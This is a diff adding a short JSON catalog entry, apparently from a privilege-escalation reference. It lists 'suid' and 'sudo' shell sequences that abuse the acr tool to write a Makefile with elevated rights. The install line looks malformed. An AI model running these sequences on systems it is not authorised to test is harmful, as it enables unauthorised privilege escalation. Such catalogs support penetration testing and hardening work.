@@ -1,0 +1,16 @@
+{
+  "functions": {
+    "suid": [
+      {
+        "description": "",
+        "code": "sudo install acr $(which acr) .\ntouch Makefile && chmod +x Makefile\necho DATA > Makefile\n./acr -r Makefile\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "",
+        "code": "sudo install acr $(which acr) .\ntouch Makefile && chmod +x Makefile\necho DATA > Makefile\nsudo acr -r Makefile\n"
+      }
+    ]
+  }
+}
